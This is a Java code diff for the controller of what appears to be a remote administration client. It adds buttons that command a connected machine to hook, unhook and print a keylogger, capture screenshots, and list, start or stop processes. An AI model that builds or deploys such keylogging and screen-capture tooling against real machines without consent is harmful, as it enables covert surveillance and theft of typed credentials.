@@ -3,9 +3,8 @@ package controller;
 import model.Client;
 import view.Login;
 import view.Home;
-import view.card.Keylogger;
-
-import java.awt.event.ActionListener;
+import java.awt.image.BufferedImage;
+import java.util.ArrayList;
 
 public class Controller
 {
@@ -25,13 +24,72 @@ public class Controller
     {
         login.getConnectButton().addActionListener(e -> connectServer());
         home.getLogPanel().getHookButton().addActionListener(e -> handleKeyLogger("Hook"));
+        home.getLogPanel().getUnHookButton().addActionListener(e -> handleKeyLogger("Unhook"));
         home.getLogPanel().getPrintButton().addActionListener(e -> handleKeyLogger("Print"));
+        home.getScreenPanel().getTakeButton().addActionListener(e -> handleScreenShot("ScreenShot", 1));
+        home.getScreenButton().addActionListener(e -> handleScreenShot("ScreenShot", 2));
+
+        home.getProcessPanel().getStartButton().addActionListener(e -> handleProcess("StartProcess"));
+        home.getProcessPanel().getStopButton().addActionListener(e -> handleProcess("StopProcess"));
+        home.getProcessPanel().getListButton().addActionListener(e -> handleProcess("ListProcess"));
+
+        home.getAppPanel().getListButton().addActionListener(e -> handleApp("ListApp"));
     }
 
+    private void handleApp(String command)
+    {
+        System.out.println("Vuighe");
+        client.handleApp(command);
+    }
 
+    private void handleProcess(String command)
+    {
+        client.sendCommand(command);
+        switch (command)
+        {
+            case ("ListProcess"):
+            {
+                ArrayList<ArrayList<String>> infoProcess = client.getProcess().listProcess();
+                home.getProcessPanel().updateProcessTable(infoProcess);
+                break;
+            }
+
+            case ("StopProcess"):
+            {
+                String IDProcess = home.getProcessPanel().getClickedProcessID();
+                String notifyStopStatus = client.getProcess().stopProcess(IDProcess);
+                notifyStopStatus = notifyStopStatus.trim();
+
+                System.out.println(notifyStopStatus);
+            }
+        }
+    }
+
+    private void handleScreenShot(String command, int type)
+    {
+        if (type == 2 && !firstTakeScreen)
+        {
+            return;
+        }
+
+        BufferedImage image = client.handleScreenShot(command);
+
+//        try
+//        {
+            //ImageIO.write(image, "jpg", new File("./screenshot/image.jpg"));
+
+            home.getScreenPanel().addImageLabel(image);
+//        }
+//        catch (IOException ioE)
+//        {
+//            ioE.printStackTrace();
+//        }
+
+        firstTakeScreen = false;
+    }
     private void handleKeyLogger(String command)
     {
-        String keylogger = client.readKeyLogger(command);
+        String keylogger = client.handleKeyLogger(command);
 
         home.getLogPanel().getKeyTextArea().setText(keylogger);
     }
@@ -55,4 +113,5 @@ public class Controller
     private Login login;
     private Home home;
     private Client client;
+    private Boolean firstTakeScreen = true;
 }
